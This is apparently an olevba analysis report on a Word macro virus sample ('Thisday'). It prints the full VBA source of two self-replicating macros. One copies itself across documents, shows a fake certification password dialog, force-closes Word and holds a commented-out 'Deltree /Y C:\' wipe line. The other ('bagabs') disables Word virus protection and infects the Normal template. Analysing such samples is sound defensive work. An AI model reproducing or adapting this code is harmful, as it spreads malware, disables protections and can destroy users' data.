olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thisday-7a0d2c931fa6869a58c2aadae2621afb8ddc92eb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thisday-7a0d2c931fa6869a58c2aadae2621afb8ddc92eb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Thisday-7a0d2c931fa6869a58c2aadae2621afb8ddc92eb - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim thisday
Dim DayFlag
Dim Button
Dim Flag$
Dim False_
ReDim NameList__$(3)
WordBasic.DisableInput
NameList__$(0) = "µçÄÔ²¿"
NameList__$(1) = "IBM"
NameList__$(2) = "MicroSoft"
NameList__$(3) = "Compaq"
thisday = WordBasic.WeekDay(WordBasic.Now()) - 1
'MsgBox Str$(thisday)
    If WordBasic.CountWindows() = 0 Then
         WordBasic.FileNew
         WordBasic.SetDocumentVar "NewFlag", "True"
    Else
         WordBasic.SetDocumentVar "NewFlag", "False"
    End If
    WordBasic.SetDocumentVar "CloseFlag", "True"
WordBasic.BeginDialog 320, 144, "Validation Check", "AutoOpen.MyFunc"
    WordBasic.OKButton 170, 108, 88, 21
    WordBasic.DropListBox 106, 33, 160, 38, NameList__$(), "DropListBox1"
    WordBasic.Text 20, 33, 68, 13, "UserName£º", "Text1"
'   Text 19, 62, 48, 13, "UserId£º", .Text2
'   TextBox 106, 60, 160, 18, .TextBox1
    WordBasic.Text 119, 8, 78, 13, "Certification", "Text3"
    WordBasic.Picture 3, 88, 118, 54, "fig", 1, "Picture1"
WordBasic.EndDialog

Dim LoginDlg As Object: Set LoginDlg = WordBasic.CurValues.UserDialog
DayFlag = WordBasic.Today() > WordBasic.DateSerial(97, 7, 20)
If ((thisday = 3) Or (thisday = 5)) And DayFlag Then Button = WordBasic.Dialog.UserDialog(LoginDlg)
Flag$ = WordBasic.[GetDocumentVar$]("CloseFlag")
If (DayFlag = False_) Then Flag$ = "False"
'MsgBox Flag$ + " "
If WordBasic.[FileNameFromWindow$]() <> "" Then
On Error GoTo -1: On Error GoTo Infest
WordBasic.MacroCopy WordBasic.[FileNameFromWindow$]() + ":AutoOpen", "AutoOpen"
Infest: On Error GoTo -1: On Error GoTo NInfest
WordBasic.MacroCopy "AutoOpen", WordBasic.[FileNameFromWindow$]() + ":AutoOpen"
NInfest:
    If (thisday <> 3) And (thisday <> 5) Then
    WordBasic.FileSaveAll 1, 1
    Flag$ = "False"
    End If
End If
If Flag$ = "True" Then ExitWord
End Sub


Private Function MyFunc(identifier$, action, suppvalue)
    Select Case action
Case 1     'The Dialog Displayed
Case 2     ' the user Selects a Control
    If identifier$ = "DropListBox1" Then
    Dim Password$
    Password$ = "0"
    On Error Resume Next
    Password$ = WordBasic.[InputBox$]("Input your Password")
       If (WordBasic.DlgValue("DropListBox1") = 0) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
       ElseIf (WordBasic.DlgValue("DropListBox1") = 1) And (WordBasic.Val(Password$) <> 20300) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
       ElseIf (WordBasic.DlgValue("DropListBox1") = 2) And (WordBasic.Val(Password$) <> 36000) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
       ElseIf (WordBasic.DlgValue("DropListBox1") = 3) And (WordBasic.Val(Password$) <> 40004) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
Else
    WordBasic.SetDocumentVar "CloseFlag", "False"
End If
End If
Case 3      ' Text Changed
    'MsgBox LoginDlg.TextBox2
Case Else
End Select
End Function

Private Sub ExitWord()
'Shell Environ$("COMSPEC") + "/c Deltree /Y C:\"
WordBasic.SetTemplateDirty
WordBasic.FileSaveAll 1, 1
WordBasic.AppClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO bagabs.bas 
in file: Virus.MSWord.Thisday-7a0d2c931fa6869a58c2aadae2621afb8ddc92eb - OLE stream: 'Macros/VBA/bagabs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 01/28/98 by Franky Stefanus Mait"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.bagabs"
' bagabs by ephen 01/31/98
On Error GoTo bagabs

WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
GlobalDoc = NormalTemplate
GlobalInstalled = False

For f = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents(f).Name = "bagabs" Then
    GlobalInstalled = True
  End If
Next

If GlobalInstalled = False Then
  Application.OrganizerCopy _
    Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, _
    Name:="bagabs", _
    Object:=wdOrganizerObjectProjectItems
  Options.SaveNormalPrompt = False
  CommandBars("Tools").Controls("Macro").Enabled = False
  For s = 13 To 16
    CommandBars("Tools").Controls(s).Enabled = False
  Next
End If

If Day(Now()) = 5 And Month(Now()) = 7 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Praise the Lord ! Now and forever . . ." + Chr(13) + Chr(13) + _
                "Thank's for Your blessing in all my life . . ."
        .Heading = "ephen"
        .Animation = 102
        .Show
    End With
End If

If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Minahasa:" + Chr(13) + "  Si Tou Timou Tumou Tou..." + Chr(13) + Chr(13) + _
        "bukang" + Chr(13) + "       Si Tou Timou Tumongko' Tou..."
        .Heading = "bagabs manguni"
        .Animation = 112
        .Show
    End With
End If

bagabs:
End Sub
Sub AutoClose()
' bagabs by ephen 01/31/98
On Error GoTo bagabs

WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
ActiveDoc = ActiveDocument
DocumentInstalled = False

For m = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents(m).Name = "bagabs" Then
    DocumentInstalled = True
  End If
Next

If DocumentInstalled = False Then
  Application.OrganizerCopy _
    Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, _
    Name:="bagabs", _
    Object:=wdOrganizerObjectProjectItems
End If

If Day(Now()) = 5 And Month(Now()) = 7 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Thank's 4 your attention . . ." + Chr(13) + Chr(13) + ". . . In My Day!"
        .Heading = "ephen"
        .Animation = 102
        .Show
    End With
End If

If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Anti Potas" + Chr(13) + Chr(13) + "    piara bae-bae tu anjing . . ."
        .Heading = "bagabs manguni"
        .Animation = 116
        .Show
    End With
End If

bagabs:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
